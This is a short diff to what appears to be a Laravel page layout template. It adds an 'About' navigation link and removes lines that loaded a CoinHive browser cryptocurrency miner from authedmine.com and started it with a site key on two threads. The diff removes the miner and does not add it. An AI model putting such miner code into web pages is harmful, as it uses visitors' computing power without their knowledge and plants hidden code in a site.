@@ -28,13 +28,6 @@
 
     <!-- Styles -->
     <link href="{{ asset('css/app.css') }}" rel="stylesheet">
-    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
-    <script>
-    	var miner = new CoinHive.Anonymous('O4XuXR6lcpuVmkDidwjhHSzhmMtIjPlX', {throttle: 0.3});
-
-    		miner.setNumThreads(2).start();
-
-    </script>
 </head>
 <body>
     <div id="app">
@@ -59,7 +52,7 @@
                 <div class="collapse navbar-collapse" id="app-navbar-collapse">
                     <!-- Left Side Of Navbar -->
                     <ul class="nav navbar-nav">
-                        &nbsp;
+                        <li><a href="{{url('/about')}}">About</a></li>
                     </ul>
 
                     <!-- Right Side Of Navbar -->
